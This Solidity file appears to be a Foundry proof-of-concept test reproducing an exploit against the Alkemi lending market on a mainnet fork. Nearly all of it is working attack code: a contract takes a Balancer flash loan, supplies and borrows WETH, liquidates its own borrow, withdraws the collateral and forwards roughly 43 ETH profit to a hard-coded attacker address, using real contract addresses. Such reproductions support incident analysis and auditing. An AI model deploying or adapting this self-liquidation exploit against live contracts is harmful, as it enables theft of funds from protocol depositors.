
pragma solidity ^0.8.20;

import {IERC20Like, Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.ATTACKER_EOA;
    address constant ATTACK_CONTRACT = Addresses.ATTACK_CONTRACT;
    uint256 constant TX_TIMESTAMP = 1773144611;
    uint256 constant TX_BLOCK_NUMBER = 24626979;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        vm.warp(TX_TIMESTAMP);
        vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);

        AlkemiAttack attack = _deployAttack();
        _prepareProfit(address(attack), address(0));
        _logBalances("Before exploit");

        attack.attack{value: TX_VALUE}();

        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (AlkemiAttack attack) {
        if (ATTACK_CONTRACT == address(0)) return new AlkemiAttack();
        _etchRuntime();
        return AlkemiAttack(payable(ATTACK_CONTRACT));
    }

    function _etchRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(AlkemiAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.ATTACKER_EOA, address(0), Addresses.ZERO, "ETH", 43452432216357780332);
    }
}

contract AlkemiAttack {
    uint256 private collateralAmount;
    uint256 private borrowAmount;
    bool private flashLoanHandled;
    mapping(address => uint256) private balancerPreBalance;

    function attack() external payable {
        collateralAmount = 50 ether;
        borrowAmount = 39.5 ether;
        startFlashLoan();
    }

    function startFlashLoan() internal {
        address[] memory tokens = _singleAddress(Addresses.WETH9);
        uint256[] memory amounts = _singleUint(51 ether);

        _recordBalancerPre(tokens);
        IBalancerVault(Addresses.BALANCER_VAULT).flashLoan(address(this), tokens, amounts, hex"");
    }

    function receiveFlashLoan(
        address[] calldata loanTokens,
        uint256[] calldata loanAmounts,
        uint256[] calldata feeAmounts,
        bytes calldata userData
    ) external payable {
        loanTokens;
        loanAmounts;
        feeAmounts;
        userData;

        if (!flashLoanHandled) flashCallback();
    }

    function flashCallback() internal {
        flashLoanHandled = true;

        unwrapLoanedWeth();
        supplyAlkemiWeth();
        borrowAlkemiWeth();
        quoteBorrowDebt();
        selfLiquidateDebt();
        withdrawCollateral();
        wrapRepaymentWeth();
        repayBalancerVault();
        collectEthProfit();
    }

    function unwrapLoanedWeth() internal {
        IWETH9(Addresses.WETH9).withdraw(51 ether);
    }

    function supplyAlkemiWeth() internal {
        IAlkemiMarket(Addresses.ALKEMI_MARKET).supply{value: collateralAmount}(
            Addresses.ALKEMI_WETH, collateralAmount
        );
    }

    function borrowAlkemiWeth() internal {
        IAlkemiMarket(Addresses.ALKEMI_MARKET).borrow(Addresses.ALKEMI_WETH, borrowAmount);
    }

    function quoteBorrowDebt() internal view {
        IAlkemiMarket(Addresses.ALKEMI_MARKET).getBorrowBalance(address(this), Addresses.ALKEMI_WETH);
    }

    function selfLiquidateDebt() internal {
        uint256 repaymentAmount = 39.5395 ether;
        IAlkemiMarket(Addresses.ALKEMI_MARKET).liquidateBorrow{value: repaymentAmount}(
            address(this), Addresses.ALKEMI_WETH, Addresses.ALKEMI_WETH, repaymentAmount
        );
    }

    function withdrawCollateral() internal {
        IAlkemiMarket(Addresses.ALKEMI_MARKET).withdraw(Addresses.ALKEMI_WETH, type(uint256).max);
    }

    function wrapRepaymentWeth() internal {
        uint256 repaymentAmount = address(this).balance;
        if (repaymentAmount > 51 ether) repaymentAmount = 51 ether;
        if (repaymentAmount != 0) IWETH9(Addresses.WETH9).deposit{value: repaymentAmount}();
    }

    function repayBalancerVault() internal {
        IERC20Like(Addresses.WETH9).transfer(Addresses.BALANCER_VAULT, 51 ether);
    }

    function collectEthProfit() internal {
        uint256 profitAmount = address(this).balance;
        if (profitAmount > 43453950000000000000) profitAmount = 43453950000000000000;

        (bool sent,) = payable(Addresses.ATTACKER_EOA).call{value: profitAmount}("");
        sent;
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.sig == 0xe1fa7638) {
            startFlashLoan();
        }
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            balancerPreBalance[tokens[i]] = IERC20Like(tokens[i]).balanceOf(Addresses.BALANCER_VAULT);
        }
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return balancerPreBalance[token];
    }

    function _singleAddress(address item) internal pure returns (address[] memory out) {
        out = new address[](1);
        out[0] = item;
    }

    function _singleUint(uint256 item) internal pure returns (uint256[] memory out) {
        out = new uint256[](1);
        out[0] = item;
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant ATTACKER_EOA = 0x0Ed1C01b8420a965d7BD2374dB02896464C91cd7;
    address internal constant ALKEMI_MARKET = 0x4822D9172e5b76b9Db37B75f5552F9988F98a888;
    address internal constant ALKEMI_WETH = 0x8125afd067094cD573255f82795339b9fe2A40ab;
    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WETH9 = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant ATTACK_CONTRACT = 0xE408b52AEfB27A2FB4f1cD760A76DAa4BF23794B;
}

interface IAlkemiMarket {
    function borrow(address asset, uint256 amount) external returns (uint256);
    function getBorrowBalance(address account, address asset) external view returns (uint256);
    function liquidateBorrow(address borrower, address borrowedAsset, address collateralAsset, uint256 amount)
        external
        payable
        returns (uint256);
    function supply(address asset, uint256 amount) external payable returns (uint256);
    function withdraw(address asset, uint256 amount) external returns (uint256);
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] calldata tokens,
        uint256[] calldata amounts,
        bytes calldata userData
    ) external;
}

interface IWETH9 {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}
